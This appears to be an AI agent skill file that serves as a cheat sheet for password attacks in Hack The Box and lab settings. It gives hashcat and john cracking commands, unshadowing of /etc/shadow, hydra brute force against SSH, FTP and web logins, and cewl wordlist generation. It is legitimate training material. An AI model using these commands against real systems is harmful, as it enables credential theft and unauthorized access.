---
name: htb-password-attacks
description: >
  Password and hash attacks in an authorized HTB/lab context. Trigger this when
  you have an authentication service to brute-force (SSH, HTTP login, FTP, RDP,
  SMB) or a hash to crack. Covers: hash identification (hash-identifier), offline
  cracking (john, hashcat) with rules and wordlists, targeted online brute force
  (hydra), wordlist generation (cewl), and manipulation of rockyou/SecLists.
  Produces cleartext passwords.
metadata:
  type: reference
  category: credentials
  legal: "Authorized targets only (HTB, labs, CTF, systems you own)."
---

# HTB — Password attacks

## When to use this skill
- You have a **hash** (extracted from /etc/shadow, a database, a Kerberoast…).
- You have an **auth service** and a list of users to test.

## A. Offline cracking (preferred: no network noise)

### 1) Identify the hash
```bash
hash-identifier            # interactive
# or find the hashcat mode on hashcat.net/wiki/example_hashes
```

### 2) hashcat (fast, GPU) — modes common in HTB
| Type | `-m` |
|---|---|
| MD5 | 0 |
| SHA-256 | 1400 |
| NTLM | 1000 |
| NetNTLMv2 | 5600 |
| Kerberos AS-REP | 18200 |
| Kerberos TGS (Kerberoast) | 13100 |
| bcrypt | 3200 |
| /etc/shadow sha512crypt | 1800 |

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
# with rules (strongly recommended)
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 3) john (handy for system formats)
```bash
# merge passwd + shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
john --show unshadowed.txt

# special formats via *2john
ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash
zip2john secret.zip > zip.hash && john zip.hash
keepass2john db.kdbx > kp.hash && john kp.hash
```

## B. Online brute force (targeted, last resort)

```bash
IP=10.10.10.10
# SSH
hydra -l user -P rockyou.txt ssh://"$IP" -t 4
# FTP
hydra -L users.txt -P rockyou.txt ftp://"$IP"
# HTTP POST form (adapt the fields and the failure message)
hydra -l admin -P rockyou.txt "$IP" http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
# SMB / WinRM: prefer netexec (see htb-smb-enum / htb-active-directory)
```

## C. Generate a targeted wordlist
```bash
cewl -d 2 -m 5 http://"$IP" -w custom.txt        # words from the site
# variations (leetspeak, years):
hashcat --stdout custom.txt -r /usr/share/hashcat/rules/best64.rule > custom-mangled.txt
```

## Reflexes
- Always try **password reuse** before brute-forcing: a password found
  somewhere often works elsewhere.
- Online brute force = risk of lockout; keep `-t` low and target a single user.
- After cracking, replay the creds against SMB/WinRM/SSH (`netexec ... -u -p`).
- Record every user:pass pair in `creds.txt`.
